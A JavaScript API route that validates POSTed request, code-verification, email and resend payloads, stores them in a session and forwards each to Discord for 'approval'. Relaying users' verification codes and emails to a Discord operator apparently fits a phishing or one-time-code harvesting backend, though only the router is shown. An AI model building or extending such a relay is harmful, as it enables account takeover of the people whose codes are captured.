import {
  processRequest,
  processVerify,
  processResend,
  processEmail,
  processVerifyEmail,
  validatePayload,
} from "../lib/handle-submit.js";
import { createSession, submitCode, requestResendCode, submitEmail, submitEmailCode } from "../lib/session-store.js";
import { getSiteMode } from "../lib/site-mode.js";
import {
  sendApprovalRequest,
  sendCodeVerificationRequest,
  sendResendApprovalRequest,
  sendEmailSubmission,
  sendEmailCodeVerificationRequest,
} from "../lib/discord.js";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.status(405).json({ ok: false });
    return;
  }

  try {
    const payload = validatePayload(req.body);

    if (payload.type === "request") {
      const result = await processRequest(payload, {
        createSession,
        sendApprovalRequest,
        getSiteMode,
      });
      res.status(200).json(result);
      return;
    }

    if (payload.type === "verify") {
      const result = await processVerify(payload, {
        submitCode,
        sendCodeVerificationRequest,
      });
      res.status(200).json(result);
      return;
    }

    if (payload.type === "email") {
      const result = await processEmail(payload, {
        submitEmail,
        sendEmailSubmission,
      });
      res.status(200).json(result);
      return;
    }

    if (payload.type === "verify_email") {
      const result = await processVerifyEmail(payload, {
        submitEmailCode,
        sendEmailCodeVerificationRequest,
      });
      res.status(200).json(result);
      return;
    }

    const result = await processResend(payload, {
      requestResendCode,
      sendResendApprovalRequest,
    });
    res.status(200).json(result);
  } catch {
    res.status(400).json({ ok: false });
  }
}
